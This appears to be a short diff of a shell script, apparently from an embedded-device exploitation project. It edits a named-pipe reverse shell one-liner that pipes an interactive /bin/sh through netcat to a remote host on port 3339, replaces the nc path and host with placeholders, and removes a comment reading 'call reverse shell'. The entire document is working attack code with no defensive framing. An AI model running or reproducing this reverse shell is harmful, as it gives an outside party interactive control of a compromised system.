@@ -1,5 +1,3 @@
-#!/mnt/usb1_1_1/sh -i
-# call reverse shell
-rm -f /tmp/f ; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|/mnt/usb1_1_1/nc [PLACEHOLDER] 3339 > /tmp/f 
+rm -f /tmp/f ; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|[PLACEHOLDER1]/nc [PLACEHOLDER2] 3339 > /tmp/f 
 
 
